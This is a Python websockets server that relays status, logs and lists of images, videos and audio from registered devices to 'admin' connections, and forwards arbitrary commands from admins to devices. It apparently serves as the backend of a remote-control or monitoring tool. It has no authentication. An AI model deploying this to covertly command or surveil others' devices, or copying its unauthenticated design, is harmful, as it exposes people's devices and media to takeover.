import asyncio
import json
import os
import time
import websockets

clients = {}
admins = {}


async def safe_send(ws, text: str):
    try:
        await ws.send(text)
        return True
    except Exception:
        return False


async def broadcast_admins(msg: dict):
    data = json.dumps(msg)
    for group in list(admins.values()):
        for ws in list(group):
            await safe_send(ws, data)


async def handler(ws):
    role = None
    device_id = None
    admin_id = None
    try:
        async for raw in ws:
            try:
                msg = json.loads(raw)
            except Exception:
                continue
            t = msg.get("type")

            if t == "register_client":
                role = "client"
                device_id = msg.get("deviceId", "unknown")
                clients[device_id] = ws
                print(f"[+] client online: {device_id}", flush=True)
                await broadcast_admins({"type": "client_online", "deviceId": device_id})
                await safe_send(ws, json.dumps({"type": "welcome", "deviceId": device_id}))

            elif t == "register_admin":
                role = "admin"
                admin_id = msg.get("deviceId", "admin")
                admins.setdefault(admin_id, set()).add(ws)
                print(f"[+] admin online: {admin_id}", flush=True)
                await safe_send(ws, json.dumps({
                    "type": "devices",
                    "devices": [
                        {"id": did, "online": True, "lastSeen": int(time.time() * 1000)}
                        for did in clients.keys()
                    ]
                }))

            elif t == "status":
                await broadcast_admins({"type": "status", "deviceId": device_id, **msg})

            elif t == "log":
                await broadcast_admins({
                    "type": "log",
                    "deviceId": device_id,
                    "message": msg.get("message", ""),
                    "ts": int(time.time() * 1000)
                })

            elif t == "media_list":
                await broadcast_admins({
                    "type": "media_list",
                    "deviceId": device_id,
                    "images": msg.get("images", []),
                    "videos": msg.get("videos", []),
                    "audio": msg.get("audio", [])
                })

            elif t == "command":
                target = msg.get("deviceId")
                cmd = msg.get("cmd")
                payload = msg.get("payload", {})
                print(f"[cmd] {target} <- {cmd}", flush=True)

                if target in clients:
                    ok = await safe_send(clients[target], json.dumps({
                        "type": "command",
                        "cmd": cmd,
                        "payload": payload,
                        "ts": int(time.time() * 1000)
                    }))
                    await safe_send(ws, json.dumps({
                        "type": "ack",
                        "deviceId": target,
                        "ok": ok
                    }))
                else:
                    await safe_send(ws, json.dumps({
                        "type": "ack",
                        "deviceId": target,
                        "ok": False,
                        "error": "offline"
                    }))

    except Exception as e:
        print(f"[!] handler error: {e}", flush=True)
    finally:
        if role == "client" and device_id:
            clients.pop(device_id, None)
            print(f"[-] client offline: {device_id}", flush=True)
            await broadcast_admins({"type": "client_offline", "deviceId": device_id})
        elif role == "admin" and admin_id:
            admins.get(admin_id, set()).discard(ws)


async def main():
    port = int(os.environ.get("PORT", 10000))
    async with websockets.serve(handler, "0.0.0.0", port, ping_interval=20, ping_timeout=20):
        print(f"Server started on :{port}", flush=True)
        await asyncio.Future()


if __name__ == "__main__":
    asyncio.run(main())
